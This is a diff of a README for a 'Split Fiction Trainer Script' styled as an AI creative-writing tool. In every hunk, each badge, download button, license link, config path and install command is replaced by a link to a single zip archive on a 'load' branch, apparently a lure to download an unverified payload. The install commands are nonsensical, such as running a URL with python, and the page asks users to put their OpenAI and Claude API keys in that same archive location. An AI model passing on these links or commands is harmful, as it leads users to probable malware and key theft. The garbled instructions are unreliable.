@@ -1,14 +1,14 @@
 # Split Fiction Trainer Script 🛠️
 
-![Release Status](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip)
-![License](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip)
-![PRs Welcome](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip)
-![OpenAI API](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip)
-![Claude](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip)
+![Release Status](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip)
+![License](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip)
+![PRs Welcome](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip)
+![OpenAI API](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip)
+![Claude](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip%20Split%20Fiction%20Trainer-Click%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip)
+[![Download](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip%20Split%20Fiction%20Trainer-Click%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip)
 
 ---
 
@@ -61,12 +61,12 @@ Unleash your storytelling potential in just a few steps.
 ### 1. Requirements
 
 - Python 3.9+ (auto-detects on install)
-- https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip 18+ for UI (optional)
+- https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip 18+ for UI (optional)
 - API keys for OpenAI and/or Claude (see below)
 
 ### 2. Download Split Fiction Trainer
 
-[![Download](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip%20Split%20Fiction%20Trainer-Click%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip)
+[![Download](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip%20Split%20Fiction%20Trainer-Click%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip)
 
 ### 3. Install
 
@@ -77,21 +77,21 @@ Run the tailored installer for your OS:
 - Double-click and follow the magic wizard
 
 **For macOS/Linux**
-- Download the `https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip`
+- Download the `https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip`
 - In terminal:  
-  `tar -xzf https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip && cd splitfictiontrainer && https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip`
+  `tar -xzf https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip && cd splitfictiontrainer && https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip`
 
 **For Advanced Users**
 - Clone the repo:
-  git clone https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip
+  git clone https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip
 - Install dependencies:
-  pip install -r https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip
+  pip install -r https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip
 - Run:
-  python https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip
+  python https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip
 
 ### 4. Configure API Integration
 
-- Place your API keys for **OpenAI** and/or **Claude AI** in `https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip`
+- Place your API keys for **OpenAI** and/or **Claude AI** in `https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip`
 - e.g.:
   openai_key: "sk-xxxx"
   claude_key: "claude-xxxx"
@@ -134,7 +134,7 @@ Harness the creative intelligence of industry-leading models:
 
 > **Privacy:** Your stories and prompts never leave your machine unless you enable cloud sync.
 
-More information in `https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip`.
+More information in `https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip`.
 
 ---
 
@@ -164,7 +164,7 @@ Use responsibly. Stay creative!
 
 ## 📜 License
 
-This repository is distributed under the [MIT License](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip).  
+This repository is distributed under the [MIT License](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip).  
 Copyright (c) 2025
 
 ---
@@ -173,7 +173,7 @@ Copyright (c) 2025
 
 Download the Split Fiction Trainer Script and join the revolution in AI-based creative writing tools.
 
-[![Download](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip%20Split%20Fiction%20Trainer-Click%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/fiction_hub_trainer_script_split_1.9.zip)
+[![Download](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip%20Split%20Fiction%20Trainer-Click%20Here-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rohith244/split-fiction-trainer-script-hub/branch/load/trainer-script-fiction-split-hub-3.2-alpha.4.zip)
 
 ---
 
